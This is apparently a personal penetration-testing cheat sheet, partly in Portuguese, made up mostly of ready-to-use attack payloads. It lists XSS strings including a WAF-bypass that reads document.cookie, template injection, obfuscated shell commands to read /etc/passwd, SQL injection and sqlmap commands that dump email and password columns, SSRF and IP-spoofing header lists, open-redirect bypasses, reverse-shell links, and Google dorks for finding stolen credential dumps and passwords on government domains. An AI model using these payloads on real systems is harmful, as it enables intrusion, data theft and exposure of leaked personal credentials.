---
title: Out of the Box - Payloads
date: 2023-10-28 00:00:00
---

## Payload Lists
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/cujanovic/Markdown-XSS-Payloads
https://github.com/pwntester/ysoserial.net
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks (APIs)
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3 (AWS Buckets)
http://www.xss-payloads.com


## Payload keys
Bypass using UTF-8
```
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
Null = %00
```


XSS Ideas
```
Básicos e preferidos:
<script>alert(1)</script>
<script>alert(1)//
<script src="http://xss.rocks/xss.js"></script>
<img src/onerror=alert(1)> 
<a href="javascript:alert(1)"></a>

XSS poliglota:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

Cross Site Scripting (XSS) Akamai WAF Bypass
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>

Ideia de injetar <style> com XSS ou injetar outras tags html para formar uma nova página de login: 
https://saajanbhujel.medium.com/how-i-got-10-000-from-github-for-bypassing-filtration-of-html-tags-db31173c8b37

XSS fazendo um ssrf:.
<script>window.location="http://endereço.."</script>

Others:
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

```javascript
jQuery Version:
alert(jQuery.fn.jquery);
```

Angular Template Injection:
```
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('alert(/XSS Stored!/)')()}}
1023+1 ou {{1023+1}}
```

Ruby Template Injection
```
<%= 7*7 %>
```

Reading /etc/passwd File:
```
1) cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
2) ??n/??t$IFS/?tc/????wd
3) ??n${PATH%%[a-z]*}??t$IFS${PATH%%[a-z]*}??c${PATH%%u*}?????d
4) ../../../../../../../../../../../../etc/passwd

Explantion:
$'\x41' => 'A' (HEX)
$'\U41' => 'A'  (HEX Unicode)
$'\101' => 'A' (Octal)
```

SQL Injection Ideas:
```
1+OR/AND+1=1 and sELeCt/*Test*/1 and so .

/?id=1%27%20AND%20%271%27=LENGTH(%27;%27)%20--+
/?id=1%27%20AND%20%271%27=LENGTH(%27;;%27)%20--+

/?id=1%27%20AND%20%271%27=STRCMP(%22;%22,%20%22;%22);%20--+
/?id=1%27%20AND%20%271%27=STRCMP(%22;;%22,%20%22;%22);%20--+

/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=1)%20--+
/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=12)%20--+

---
Blind SQL Injection & Bypass
Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

----
SQL injection to RCE:
https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d
```

RCE:
```
https://www.revshells.com/
https://www.100security.com.br/reverse-shell
https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10
```

Some SQLMap Commands to start:
```
https://github.com/sqlmapproject/sqlmap/wiki/Usage
Workspace: C:\Users\[usermachine]\AppData\Local\sqlmap\output

python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=* dbms
python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=* dbms --cookie 'ASP.NET_SessionId=abc123'

python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=1 dbms --level=2,3,4,5

python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=1 --privileges

python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=1 --tables --fresh-queries
python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=1 --sql-shell

python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=1 -D [database_name] -T [table_name] --columns	--fresh-queries
python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=1 -D [database_name] -T [table_name] -C email,nome,senha --dump --fresh-queries

python.exe c:\sqlmap\sqlmap.py -u [URL]?[Param]=1 -D [database_name] -T [table_name] --dump --predict-output

----

batch:
python.exe c:\sqlmap\sqlmap.py -my \temp\sqlmap_targets.txt dbms
```

WAF - ByPass Controle por IP
```
X-Originating-IP:localhost
X-Forwarded-For:localhost
X-Remote-IP:localhost
X-Remote-Addr:localhost
X-Forwarded-Host:localhost
X-Client-IP:localhost
X-Remote-IP:localhost
X-Remote-Addr:localhost
X-Host:localhost
True-Client-Ip:localhost
```

Forget Password Testing ( Method 10 ) ==> #WayToInjection
Play With Email Header Injection.
```
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

Open redirect/SSRF payload generator
https://tools.intigriti.io/redirector/
```
basic payloads
https://google.com/redirect.php?redirect=https:/facebook.com
https://google.com/redirect.php?redirect=https://facebook.com
https://google.com/redirect.php?redirect=http:/\/\facebook.com
https://google.com/redirect.php?redirect=https:/\facebook.com
https://google.com/redirect.php?redirect=#facebook.com
https://google.com/redirect.php?redirect=#%20@facebook.com
https://google.com/redirect.php?redirect=/facebook.com

URL encoding
https://google.com/redirect.php?redirect=%2Ffacebook.com
https://google.com/redirect.php?redirect=%2F%2Ffacebook.com
https://google.com/redirect.php?redirect=https%3A%2F%2Ffacebook.com

CRLF
https://google.com/redirect.php?redirect=%0D%0A/facebook.com

a whitelisted domain or keyword
https://google.com/redirect.php?redirect=google.com.facebook.com
https://google.com/redirect.php?redirect=google.comfacebook.com

"https:" to bypass "//" blacklisted keyword
https://google.com/redirect.php?redirect=https:facebook.com

"\/" to bypass "//" blacklisted keyword
https://google.com/redirect.php?redirect=\/\/facebook.com/
https://google.com/redirect.php?redirect=/\/facebook.com/

parameter pollution
https://google.com/redirect.php?redirect=?next=google.com&next=facebook.com

"@" character, browser will redirect to anything after the "@"
https://google.com/redirect.php?redirect=@facebook.com

"//" to bypass "http" blacklisted keyword
https://google.com/redirect.php?redirect=//facebook.com
https://google.com/redirect.php?redirect=
https://google.com/redirect.php?redirect=

Right to Left Override
https://google.com/redirect.php?redirect=%40%E2%80%AE@moc.koobecaf

null byte %00 to bypass blacklist filter
https://google.com/redirect.php?redirect=facebook%00.com

'%E3%80%82' or '。' to bypass '.' blacklisted character
https://google.com/redirect.php?redirect=facebook%E3%80%82com
https://google.com/redirect.php?redirect=facebook。com
```

SSRF Bypass List
Copy ALL headers and paste in your request.
```
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

Insecure Deserialization
```
Payloads: https://github.com/pwntester/ysoserial.net
Json insercure deserialization: https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a

Json payloads:
https://github.com/pwntester/ysoserial.net
https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f
```

WT authentication bypass via jwt header injection 
```
https://www.youtube.com/watch?v=fdmnw3C8x34&ab_channel=Hacklass
```

PHP Notes
```
- Como pegar o cookie com a flag HttpOnly marcado em ambientes (PHP ou não) se houver alguma página que lista os cookies do usuário para ele mesmo (com o valor, é claro). Geralmente em ~/sistema/phpinfo
https://hackcommander.github.io/pentesting-article-1/#

- Explorar o switch do php:
	https://domdom.tistory.com/entry/HackTheBoo-Web-Juggling-Facts-Writeup%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4?category=1004766
	"body": "{\"type\":true}"

	fetch("http://198.211.107.250:1337/api/getfacts", {
	  "headers": {
	    "content-type": "application/json"
	  },
	  "body": "{\"type\":1}",
	  "method": "POST",
	  "mode": "cors",
	}).then((r)=>r.text()).
	    then((r)=>console.log(r));
```

Dorks
```
> https://www.exploit-db.com/google-hacking-database/
> https://www.googleguide.com/advanced_operators_reference.html

Encontrar vazamentos direto pelos sites de hospedagem:
> intitle:( combolist | dehashed | stealer ) site:anonfiles.com

O AnonFiles é o mais utilizado atualmente, mas também encontra coisas interessantes em outras plataformas. Google Drive incluso:

> bayfiles.com
> dataism-x.com
> pastebin.com
> justpaste.it
> file.io
> filechan.org
> mega.com
> drive.google.com

*jus.br intext:"usuario" | "senha" | "username" | "password" | "mysql"
```